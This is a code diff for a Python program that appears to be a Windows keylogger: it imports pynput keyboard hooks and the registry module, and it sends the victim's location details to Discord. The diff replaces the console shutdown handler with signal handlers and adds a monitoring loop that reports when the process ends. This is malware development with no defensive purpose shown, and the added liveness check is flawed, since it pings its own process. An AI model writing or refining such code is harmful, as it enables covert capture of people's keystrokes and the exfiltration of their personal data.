@@ -10,6 +10,8 @@ import threading
 import atexit
 import sys
 import shutil
+import signal
+import requests
 import winreg as reg
 from datetime import datetime
 from pynput import keyboard
@@ -91,25 +93,33 @@ def log_system_shutdown():
                f"Location: {CITY}, {REGION}, {COUNTRY}, {POSTAL}, Timezone: {TIMEZONE} - Connection Lost")
     send_to_discord("SYSTEM SHUTDOWN", message, 16711680)  # Red
 
-# Register shutdown hook
-atexit.register(log_system_shutdown)
+# Function to monitor if the application is still running
+def monitor():
+    while True:
+        time.sleep(5)  # Check every 5 seconds
+        if not is_process_running():
+            log_system_shutdown()
+            break
+
+# Function to check if the current process is still running
+def is_process_running():
+    """Check if the current process is still running."""
+    current_pid = os.getpid()
+    try:
+        # Check if the process is still alive
+        os.kill(current_pid, 0)
+        return True
+    except OSError:
+        return False
 
 # Handle forceful termination
-def handle_exit(sig):
+def handle_exit(sig, frame):
     log_system_shutdown()
-    os._exit(1)
+    os._exit(0)
 
-def console_control_handler(control_event):
-    if control_event in (
-        win32api.CTRL_C_EVENT,
-        win32api.CTRL_BREAK_EVENT,
-        win32api.CTRL_CLOSE_EVENT
-    ):
-        log_system_shutdown()
-        return True
-    return False
-
-win32api.SetConsoleCtrlHandler(console_control_handler, True)
+# Set up signal handlers for graceful shutdown
+signal.signal(signal.SIGINT, handle_exit)  # Handle Ctrl+C
+signal.signal(signal.SIGTERM, handle_exit)  # Handle termination signal
 
 # Function to get active window title
 def get_active_window_title():
